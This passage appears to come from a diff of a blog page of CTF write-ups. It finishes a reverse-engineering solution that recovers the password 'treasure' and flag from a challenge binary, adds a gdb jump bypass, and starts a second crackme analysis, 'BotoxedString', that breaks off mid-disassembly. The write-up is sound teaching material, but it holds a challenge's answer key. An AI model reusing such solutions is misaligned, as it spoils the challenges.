+<span class="mh">0x0000000000000940</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="mh">0x0000000000000945</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x600</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x000000000000094a</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x28</span>
+<span class="mh">0x000000000000094f</span> <span class="o">&lt;+</span><span class="mi">48</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rsi</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x202</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0xb58</span>
+<span class="mh">0x0000000000000956</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="mh">0x000000000000095b</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x600</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000960</span> <span class="o">&lt;+</span><span class="mi">65</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="mh">0x2</span>
+<span class="mh">0x0000000000000964</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa6b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">332</span><span class="o">&gt;</span>
+<span class="mh">0x000000000000096a</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x000000000000096e</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x0000000000000972</span> <span class="o">&lt;+</span><span class="mi">83</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x0000000000000975</span> <span class="o">&lt;+</span><span class="mi">86</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+<span class="mh">0x0000000000000978</span> <span class="o">&lt;+</span><span class="mi">89</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x610</span> <span class="o">&lt;</span><span class="n">strlen</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x000000000000097d</span> <span class="o">&lt;+</span><span class="mi">94</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x0000000000000981</span> <span class="o">&lt;+</span><span class="mi">98</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x9a3</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000983</span> <span class="o">&lt;+</span><span class="mi">100</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x0000000000000988</span> <span class="o">&lt;+</span><span class="mi">105</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rsi</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x1f2</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0xb81</span>
+<span class="mh">0x000000000000098f</span> <span class="o">&lt;+</span><span class="mi">112</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="mh">0x0000000000000994</span> <span class="o">&lt;+</span><span class="mi">117</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x600</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000999</span> <span class="o">&lt;+</span><span class="mi">122</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xffffffff</span>
+<span class="mh">0x000000000000099e</span> <span class="o">&lt;+</span><span class="mi">127</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0xa8c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">365</span><span class="o">&gt;</span>
+<span class="mh">0x00000000000009a3</span> <span class="o">&lt;+</span><span class="mi">132</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x00000000000009a7</span> <span class="o">&lt;+</span><span class="mi">136</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x00000000000009ab</span> <span class="o">&lt;+</span><span class="mi">140</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009ae</span> <span class="o">&lt;+</span><span class="mi">143</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x2</span>
+<span class="mh">0x00000000000009b2</span> <span class="o">&lt;+</span><span class="mi">147</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009b5</span> <span class="o">&lt;+</span><span class="mi">150</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x65</span>
+<span class="mh">0x00000000000009b7</span> <span class="o">&lt;+</span><span class="mi">152</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">303</span><span class="o">&gt;</span>
+<span class="mh">0x00000000000009bd</span> <span class="o">&lt;+</span><span class="mi">158</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x00000000000009c1</span> <span class="o">&lt;+</span><span class="mi">162</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x00000000000009c5</span> <span class="o">&lt;+</span><span class="mi">166</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009c8</span> <span class="o">&lt;+</span><span class="mi">169</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x4</span>
+<span class="mh">0x00000000000009cc</span> <span class="o">&lt;+</span><span class="mi">173</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009cf</span> <span class="o">&lt;+</span><span class="mi">176</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x73</span>
+<span class="mh">0x00000000000009d1</span> <span class="o">&lt;+</span><span class="mi">178</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">303</span><span class="o">&gt;</span>
+<span class="mh">0x00000000000009d3</span> <span class="o">&lt;+</span><span class="mi">180</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x00000000000009d7</span> <span class="o">&lt;+</span><span class="mi">184</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x00000000000009db</span> <span class="o">&lt;+</span><span class="mi">188</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009de</span> <span class="o">&lt;+</span><span class="mi">191</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="mh">0x00000000000009e2</span> <span class="o">&lt;+</span><span class="mi">195</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009e5</span> <span class="o">&lt;+</span><span class="mi">198</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x72</span>
+<span class="mh">0x00000000000009e7</span> <span class="o">&lt;+</span><span class="mi">200</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">303</span><span class="o">&gt;</span>
+<span class="mh">0x00000000000009e9</span> <span class="o">&lt;+</span><span class="mi">202</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x00000000000009ed</span> <span class="o">&lt;+</span><span class="mi">206</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x00000000000009f1</span> <span class="o">&lt;+</span><span class="mi">210</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009f4</span> <span class="o">&lt;+</span><span class="mi">213</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x6</span>
+<span class="mh">0x00000000000009f8</span> <span class="o">&lt;+</span><span class="mi">217</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000000009fb</span> <span class="o">&lt;+</span><span class="mi">220</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x72</span>
+<span class="mh">0x00000000000009fd</span> <span class="o">&lt;+</span><span class="mi">222</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">303</span><span class="o">&gt;</span>
+<span class="mh">0x00000000000009ff</span> <span class="o">&lt;+</span><span class="mi">224</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x0000000000000a03</span> <span class="o">&lt;+</span><span class="mi">228</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x0000000000000a07</span> <span class="o">&lt;+</span><span class="mi">232</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x0000000000000a0a</span> <span class="o">&lt;+</span><span class="mi">235</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x0000000000000a0d</span> <span class="o">&lt;+</span><span class="mi">238</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x74</span>
+<span class="mh">0x0000000000000a0f</span> <span class="o">&lt;+</span><span class="mi">240</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">303</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a11</span> <span class="o">&lt;+</span><span class="mi">242</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x0000000000000a15</span> <span class="o">&lt;+</span><span class="mi">246</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x0000000000000a19</span> <span class="o">&lt;+</span><span class="mi">250</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x0000000000000a1c</span> <span class="o">&lt;+</span><span class="mi">253</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x7</span>
+<span class="mh">0x0000000000000a20</span> <span class="o">&lt;+</span><span class="mi">257</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x0000000000000a23</span> <span class="o">&lt;+</span><span class="mi">260</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x65</span>
+<span class="mh">0x0000000000000a25</span> <span class="o">&lt;+</span><span class="mi">262</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">303</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a27</span> <span class="o">&lt;+</span><span class="mi">264</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span>
+<span class="mh">0x0000000000000a2b</span> <span class="o">&lt;+</span><span class="mi">268</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x0000000000000a2f</span> <span class="o">&lt;+</span><span class="mi">272</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x0000000000000a32</span> <span class="o">&lt;+</span><span class="mi">275</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x3</span>
+<span class="mh">0x0000000000000a36</span> <span class="o">&lt;+</span><span class="mi">279</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x0000000000000a39</span> <span class="o">&lt;+</span><span class="mi">282</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x61</span>
+<span class="mh">0x0000000000000a3b</span> <span class="o">&lt;+</span><span class="mi">284</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0xa4e</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">303</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a3d</span> <span class="o">&lt;+</span><span class="mi">286</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x0000000000000a42</span> <span class="o">&lt;+</span><span class="mi">291</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x74a</span> <span class="o">&lt;</span><span class="n">my_open</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a47</span> <span class="o">&lt;+</span><span class="mi">296</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x0000000000000a4c</span> <span class="o">&lt;+</span><span class="mi">301</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0xa8c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">365</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a4e</span> <span class="o">&lt;+</span><span class="mi">303</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x0000000000000a53</span> <span class="o">&lt;+</span><span class="mi">308</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rsi</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x127</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0xb81</span>
+<span class="mh">0x0000000000000a5a</span> <span class="o">&lt;+</span><span class="mi">315</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="mh">0x0000000000000a5f</span> <span class="o">&lt;+</span><span class="mi">320</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x600</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a64</span> <span class="o">&lt;+</span><span class="mi">325</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xffffffff</span>
+<span class="mh">0x0000000000000a69</span> <span class="o">&lt;+</span><span class="mi">330</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0xa8c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">365</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a6b</span> <span class="o">&lt;+</span><span class="mi">332</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="mh">0x2</span>
+<span class="mh">0x0000000000000a6f</span> <span class="o">&lt;+</span><span class="mi">336</span><span class="o">&gt;:</span>	<span class="k">jle</span>    <span class="mh">0xa87</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">360</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a71</span> <span class="o">&lt;+</span><span class="mi">338</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x12</span>
+<span class="mh">0x0000000000000a76</span> <span class="o">&lt;+</span><span class="mi">343</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rsi</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x10d</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0xb8a</span>
+<span class="mh">0x0000000000000a7d</span> <span class="o">&lt;+</span><span class="mi">350</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="mh">0x0000000000000a82</span> <span class="o">&lt;+</span><span class="mi">355</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x600</span> <span class="o">&lt;</span><span class="n">write</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000a87</span> <span class="o">&lt;+</span><span class="mi">360</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mh">0x0000000000000a8c</span> <span class="o">&lt;+</span><span class="mi">365</span><span class="o">&gt;:</span>	<span class="k">leave</span>  
+<span class="mh">0x0000000000000a8d</span> <span class="o">&lt;+</span><span class="mi">366</span><span class="o">&gt;:</span>	<span class="k">ret</span>    
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>It seems to be a conditional series to success to get the flag. The following conditions are the one to respect to get the flag:</p>
+
+<ol>
+  <li>The argument must have a lenght of 8 bytes.</li>
+  <li>The third bytes must be equal to 0x65 (‘e’).</li>
+  <li>The fifth bytes must be equal to 0x73 (‘s’).</li>
+  <li>The second bytes must be equal to 0x72 (‘r’).</li>
+  <li>The seventh bytes must be equal to 0x72 (‘r’).</li>
+  <li>The first bytes must be equal to 0x74 (‘t’).</li>
+  <li>The eighth bytes must be equal to 0x65 (‘e’).</li>
+  <li>The fourth bytes must be equal must be equal to 0x61 (‘a’).</li>
+</ol>
+
+<p>All the condition make the word “treasure”. Go to test it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./alien treasure                      
+Well <span class="k">done</span> <span class="o">!</span> Validate the chall with : flag<span class="o">{</span>S0_U_R_A_2000_k1dd1E?<span class="o">}</span>
+</code></pre></div></div>
+
+<p>You can also easily validate the chall with a jump into the “my_open” function while debugging the binary: (be attention at the PIE protection)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb <span class="nt">-q</span> ./alien 
+Reading symbols from ./alien...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+
+gdb-peda<span class="nv">$ </span>br main
+Breakpoint 1 at 0x923
+
+gdb-peda<span class="nv">$ </span>r
+Starting program: /home/meffre_q/Downloads/alien
+...
+Breakpoint 1, 0x0000555555554923 <span class="k">in </span>main <span class="o">()</span>
+
+gdb-peda<span class="nv">$ </span>jump my_open 
+Continuing at 0x55555555474e.
+Well <span class="k">done</span> <span class="o">!</span> Validate the chall with : flag<span class="o">{</span>S0_U_R_A_2000_k1dd1E?<span class="o">}</span>
+<span class="o">[</span>Inferior 1 <span class="o">(</span>process 30296<span class="o">)</span> exited normally]
+Warning: not running or target is remote
+</code></pre></div></div>
+
+<p>Done.</p>
+<h1 id="4-botoxedstring">4. BotoxedString</h1>
+<p>This one was a reverse engineering challenge. It is a basic crackme. Let’s begin by checking the binary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file crackme 
+crackme: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>f77ab6f416fda31fd9e9496b3712353d3fc1ec0d, not stripped
+
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lh</span> crackme 
+<span class="nt">-rwxr-xr-x</span> 1 meffre_q meffre_q 9.5K Sep 21 21:44 crackme
+
+<span class="nv">$ </span>nm crackme 
+00000000004007c6 T areYouLegit
+0000000000601278 B __bss_start
+0000000000601280 b completed.6661
+0000000000601268 D __data_start
+0000000000601268 W data_start
+0000000000400700 t deregister_tm_clones
+0000000000400780 t __do_global_dtors_aux
+0000000000601008 t __do_global_dtors_aux_fini_array_entry
+0000000000601270 D __dso_handle
+0000000000601018 d _DYNAMIC
+0000000000601278 D _edata
+0000000000601288 B _end
+                 U <span class="nb">exit</span>@@GLIBC_2.2.5
+0000000000400b44 T _fini
+                 U fprintf@@GLIBC_2.2.5
+00000000004007a0 t frame_dummy
+0000000000601000 t __frame_dummy_init_array_entry
+0000000000400d98 r __FRAME_END__
+                 U free@@GLIBC_2.2.5
+                 U fwrite@@GLIBC_2.2.5
+00000000006011f0 d _GLOBAL_OFFSET_TABLE_
+                 w __gmon_start__
+00000000004005e0 T _init
+0000000000601008 t __init_array_end
+0000000000601000 t __init_array_start
+0000000000400b50 R _IO_stdin_used
+                 w _ITM_deregisterTMCloneTable
+                 w _ITM_registerTMCloneTable
+0000000000601010 d __JCR_END__
+0000000000601010 d __JCR_LIST__
+                 w _Jv_RegisterClasses
+0000000000400957 T letsCheckThisPass
+0000000000400b40 T __libc_csu_fini
+0000000000400ad0 T __libc_csu_init
+                 U __libc_start_main@@GLIBC_2.2.5
+00000000004009b3 T main
+                 U malloc@@GLIBC_2.2.5
+                 U open@@GLIBC_2.2.5
+000000000040087f T passwordBeautifyier
+                 U <span class="nb">printf</span>@@GLIBC_2.2.5
+                 U <span class="nb">read</span>@@GLIBC_2.2.5
+0000000000400740 t register_tm_clones
+00000000004006d0 T _start
+0000000000601278 B stderr@@GLIBC_2.2.5
+                 U strlen@@GLIBC_2.2.5
+                 U strncmp@@GLIBC_2.2.5
+0000000000601278 D __TMC_END__
+
+<span class="nv">$ </span>./crackme 
+Usage: ./crackme Password
+
+<span class="nv">$ </span>./crackme toto
+Someone told me u were not allowed to <span class="k">do </span>that
+</code></pre></div></div>
+
+<p>We faced a basic crackme, without stripped, dynamically linked and we can see different function name thanks to “nm”.</p>
+
+<p>So let’s begin the reversing part!</p>
+
+<p>The first interesting part is the call to the “areYouLegit” function with the first program argument, in the “main” function:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">crackme</span>
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="p">.</span><span class="o">/</span><span class="n">crackme</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+
+<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">disas</span> <span class="n">main</span> 
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
+<span class="p">...</span>
+<span class="mh">0x00000000004009f2</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x30</span><span class="err">]</span>
+<span class="mh">0x00000000004009f6</span> <span class="o">&lt;+</span><span class="mi">67</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">rax</span><span class="p">,</span><span class="mh">0x8</span>
+<span class="mh">0x00000000004009fa</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rax]</span>
+<span class="mh">0x00000000004009fd</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+<span class="mh">0x0000000000400a00</span> <span class="o">&lt;+</span><span class="mi">77</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x4007c6</span> <span class="o">&lt;</span><span class="n">areYouLegit</span><span class="o">&gt;</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>The function will do 4 test on the program argument:</p>
+
+<ol>
+  <li>Check if the string size is greater than 7.</li>
+  <li>Check if the string contain at least one ‘-‘ character.</li>
+  <li>Check if the string contain at least one ‘+’ character.</li>
+  <li>Check if the string contain at least one ‘@’ character.</li>
+</ol>
+
+<p>If one of this tests failed, the function exit with an error code and the program stop their.</p>
+
+<p>After, the main function will call the function “letsCheckThisPass”, let’s disassemble it:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">disas</span> <span class="n">letsCheckThisPass</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">letsCheckThisPass</span><span class="o">:</span>
